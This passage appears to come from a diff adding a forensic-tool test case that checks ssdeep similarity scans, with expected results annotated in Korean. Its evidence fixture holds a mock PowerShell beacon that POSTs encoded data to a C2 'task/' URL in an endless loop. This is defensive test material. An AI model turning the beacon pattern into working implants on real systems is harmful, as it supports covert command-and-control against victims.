+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '200'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '201'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '202'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '203'))
+          Invoke-WebRequest -Uri ($C2 + 'task/20') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Invoke-Upload21 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '210'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '211'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '212'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '213'))
+          Invoke-WebRequest -Uri ($C2 + 'task/21') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Get-Proc22 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '220'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '221'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '222'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '223'))
+          Invoke-WebRequest -Uri ($C2 + 'task/22') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      function Test-Sandbox23 {
+          $v0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '230'))
+          $v1 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '231'))
+          $v2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '232'))
+          $v3 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Date).ToString() + '233'))
+          Invoke-WebRequest -Uri ($C2 + 'task/23') -Method POST -Body $v0 -UseBasicParsing | Out-Null
+      }
+      while ($true) { Send-Beacon2; Start-Sleep -Seconds 60 }
+  - path: scripts/backup.ps1
+    text: |
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+      # nightly backup
+      robocopy C:\Data D:\Backup /MIR /R:2 /W:5 /LOG:C:\Logs\backup.log
+  - path: case01/analysis/.keep
+    root: outside
+    text: ""
+steps:
+  - tool: misc_start_execution_log
+    note_ko: "준비: 사건 기록을 연다"
+    args:
+      case_id: CASE-001
+      output_path: ${OUTSIDE}/case01/analysis/trace.json
+      case_dir: ${OUTSIDE}/case01
+      launch_dashboard: false
+  - tool: hash_ssdeep_scan_directory
+    note_ko: "결함 호출: 폴더에서 유사도 50 이상인 파일을 찾음"
+    args:
+      directory: ${EVIDENCE}/scripts
+      threshold: 50
+  - tool: hash_ssdeep_compare
+    note_ko: "비교 호출: 두 변종을 직접 비교해 유사도를 확인함"
+    args:
+      file1: ${EVIDENCE}/scripts/WinUpdHealth.ps1
+      file2: ${EVIDENCE}/scripts/svc_helper.ps1
+expect:
+  - step: 3
+    note_ko: "두 변종은 직접 비교하면 유사도 96이다"
+    regex: 'svc_helper\.ps1 matches \S*WinUpdHealth\.ps1 \(96\)'
+  - step: 2
+    note_ko: "폴더 검사는 성공 응답이다"
+    contains: '"success": true'
+  - step: 2
+    note_ko: "응답은 비교 결과가 아니라 ssdeep 해시 목록 머리글로 시작한다"
+    contains: "ssdeep,1.1--blocksize:hash:hash,filename"
+  - step: 2
+    note_ko: "비슷한 파일이 없는 백업 스크립트도 해시 줄로 나온다"
+    regex: '96:[^,]+,\\"\S*backup\.ps1'
+  - step: 2
+    note_ko: "유사한 쌍을 알리는 matches 줄이 없다"
+    not_contains: " matches "
